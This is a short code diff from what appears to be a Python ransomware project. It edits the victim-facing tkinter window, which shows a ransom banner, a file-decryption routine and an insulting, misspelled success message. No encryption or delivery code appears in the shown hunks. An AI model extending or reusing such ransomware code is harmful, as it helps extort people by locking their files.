@@ -104,7 +104,7 @@ def decrypt_files():
                 with open(file, "wb") as thefile:
                     thefile.write(contents_decrypted)
 
-                result_label.config(text=f"Congratulations! Get decrypted bitch 😘", fg="green", bg=bg_color)
+                result_label.config(text=f"Congratulats you has been decrypted bitch 😘", fg="green", bg=bg_color)
               
             except InvalidToken:
                 result_label.config(text="No files to decrypt", fg="black")
@@ -133,6 +133,7 @@ bg_color = root.cget("bg")
 message_label = tk.Label(root, text="Unfortunately you've been hit by a ransomware :( 👍", wraplength=450, width=45, font=("Arial", 20))
 message_label.pack(pady=30)
 color_change()
+
 
 result_label = tk.Label(root, text="", font=("Arial", 20), wraplength=350, width=40)
 result_label.pack(pady=55)
